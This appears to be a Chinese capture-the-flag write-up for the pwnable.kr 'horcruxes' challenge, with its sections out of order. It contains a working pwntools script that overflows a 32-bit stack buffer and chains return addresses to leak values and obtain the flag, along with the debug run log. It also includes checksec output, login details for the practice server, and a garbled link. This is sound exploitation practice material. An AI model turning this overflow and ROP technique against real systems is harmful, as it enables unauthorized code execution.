
``` python
from pwn import \*
context.log\_level = 'debug'
hint\_addr = 0x080A0324
fd\_addr = 0x080A011D
A\_addr = 0x0809FE4B
B\_addr = 0x0809FE6A
C\_addr = 0x0809FE89
D\_addr = 0x0809FEA8
E\_addr = 0x0809FEC7
F\_addr = 0x0809FEE6
G\_addr = 0x0809FF05
rop\_addr = 0x080A0009
call\_rop = 0x0809FFFC
#payload = 'A' \* (0x74 +4) + p32(fd\_addr)
#payload = 'A' \* (0x74 + 4) + p32(hint\_addr)
#payload = 'A' \* (0x74 +4) + p32(A\_addr) + p32(B\_addr) + p32(C\_addr) + p32(D\_addr) + p32(E\_addr) + p32(F\_addr) + p32(G\_addr) + p32(rop\_addr)
payload = 'A' \* (0x74 +4) + p32(A\_addr) + p32(B\_addr) + p32(C\_addr) + p32(D\_addr) + p32(E\_addr) + p32(F\_addr) + p32(G\_addr) + p32(call\_rop)
conn = remote(host="pwnable.kr",port=9032)
conn.sendline("1")
conn.recvuntil("How many EXP did you earned? :")
conn.sendline(payload)
#conn.recvall()
conn.recvline() # recv "You'd better get more experience to kill Voldemort\n"
sum = 0
for i in range(0,7): # recv a ~ g
res = conn.recvline()
recvdata = int(res.strip('\n').split('+')[1][:-1])
log.info("The %d" % i)
log.info("recvdata %d" % recvdata)
sum += recvdata
conn.recvuntil("Menu:")
conn.sendline("1")
conn.recvuntil(" : ")
conn.sendline(str(sum))
log.success("Flag: " + conn.recvline())
```

## 5. pwn

执行脚本，获得 flag：`Magic\_spell\_1s\_4vad4\_K3daVr4!`

``` bash
whoami@DESKTOP-02CN0MD:~/pwn/horcruxes/attach$ python exp1.py
[+] Opening connection to pwnable.kr on port 9032: Done
[DEBUG] Sent 0x2 bytes:
'1\n'
[DEBUG] Received 0x39 bytes:
'Voldemort concealed his splitted soul inside 7 horcruxes.'
[DEBUG] Received 0x51 bytes:
'\n'
'Find all horcruxes, and destroy it!\n'
'\n'
'Select Menu:How many EXP did you earned? : '
[DEBUG] Sent 0x99 bytes:
00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 │AAAA│AAAA│AAAA│AAAA│
\*
00000070 41 41 41 41 41 41 41 41 4b fe 09 08 6a fe 09 08 │AAAA│AAAA│K···│j···│
00000080 89 fe 09 08 a8 fe 09 08 c7 fe 09 08 e6 fe 09 08 │····│····│····│····│
00000090 05 ff 09 08 fc ff 09 08 0a │····│····│·│
00000099
[DEBUG] Received 0x32 bytes:
"You'd better get more experience to kill Voldemort"
[DEBUG] Received 0x172 bytes:
'\n'
'You found "Tom Riddle\'s Diary" (EXP +661559703)\n'
'You found "Marvolo Gaunt\'s Ring" (EXP +-1930341090)\n'
'You found "Helga Hufflepuff\'s Cup" (EXP +2006157778)\n'
'You found "Salazar Slytherin\'s Locket" (EXP +1640323465)\n'
'You found "Rowena Ravenclaw\'s Diadem" (EXP +-1904074094)\n'
'You found "Nagini the Snake" (EXP +-1243168880)\n'
'You found "Harry Potter" (EXP +711916854)\n'
'Select Menu:'
[\*] The 0
[\*] recvdata 661559703
[\*] The 1
[\*] recvdata -1930341090
[\*] The 2
[\*] recvdata 2006157778
[\*] The 3
[\*] recvdata 1640323465
[\*] The 4
[\*] recvdata -1904074094
[\*] The 5
[\*] recvdata -1243168880
[\*] The 6
[\*] recvdata 711916854
[DEBUG] Sent 0x2 bytes:
'1\n'
[DEBUG] Received 0x1f bytes:
'How many EXP did you earned? : '
[DEBUG] Sent 0xa bytes:
'-57626264\n'
[DEBUG] Received 0x1e bytes:
'Magic\_spell\_1s\_4vad4\_K3daVr4!\n'
[+] Flag: Magic\_spell\_1s\_4vad4\_K3daVr4!
[\*] Closed connection to pwnable.kr port 9032
whoami@DESKTOP-02CN0MD:~/pwn/horcruxes/attach$
```

## 参考连接

- <a href="elink@95aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6k6h3y4U0L8$3#2H3i4K6u0r3L8r3W2T1M7$3g2U0j5$3!0E0M7q4)9J5c8X3u0D9L8$3u0Q4x3V1j5@1j5K6p5&6y4o6t1#2k6X3p5$3z5h3y4X3j5U0c8X3y4$3c8W2y4e0t1J5y4h3b7$3y4K6k6S2x3U0k6W2k6U0m8T1y4o6b7J5k6e0t1^5i4K6u0r3K9h3&6U0L8s2g2V1k6g2)9J5c8Y4y4W2j5$3y4G2L8i4m8Q4x3X3g2Z5i4K6u0W2K9h3^5`.">seccomp actions 标识符定义</a>

# horcruxes

## 0. 考察点

在 32 位程序中，执行 `call_function`，当 `function` 执行完毕后，`pc` 会指向 `call_function` + 4 字节处

## 1. 题目

|  |  |

| --- | --- |

| 1  2  3  4  5 | `Voldemort concealed his splitted soul inside` `7` `horcruxes.`  `Find` `all` `horcruxes,` `and` `ROP it!`  `author: jiwon choi`    `ssh horcruxes@pwnable.kr` `-``p2222 (pw:guest)` |

## 2. 获得基础信息

### 1. 查看文件列表，读取 readme

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7 | `horcruxes@pwnable:~$ ls` `-``l`  `total` `20`  `-``rwxr``-``xr``-``x` `1` `root root` `12424` `Aug` `8`  `2018` `horcruxes`  `-``rw``-``r``-``-``r``-``-` `1` `root root` `131` `Aug` `8`  `2018` `readme`  `horcruxes@pwnable:~$ cat readme`  `connect to port` `9032` `(nc` `0` `9032``). the` `'horcruxes'` `binary will be executed under horcruxes_pwn privilege.`  `rop it to read the flag.` |

程序以 `horcruxes_pwn` 的权限运行在本地的 `9032` 端口，考察 `rop`

### 2. 查看登录用户的信息

|  |  |

| --- | --- |

| 1  2 | `horcruxes@pwnable:~$` `id`  `uid``=``1117``(horcruxes) gid``=``1117``(horcruxes) groups``=``1117``(horcruxes)` |

用户名与所属组都是 horcruxes

### 3. 检查 horcruxes 文件

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7 | `horcruxes@pwnable:~$ checksec .``/``horcruxes`  `[``*``]` `'/home/horcruxes/horcruxes'`  `Arch:     i386``-``32``-``little`  `RELRO:    Partial RELRO`  `Stack:    No canary found`  `NX:       NX enabled`  `PIE:      No PIE (``0x809f000``)` |

## 3. 本地调试 horcruxes 文件

在 `IDA` 里查看反编译代码

|  |  |

| --- | --- |
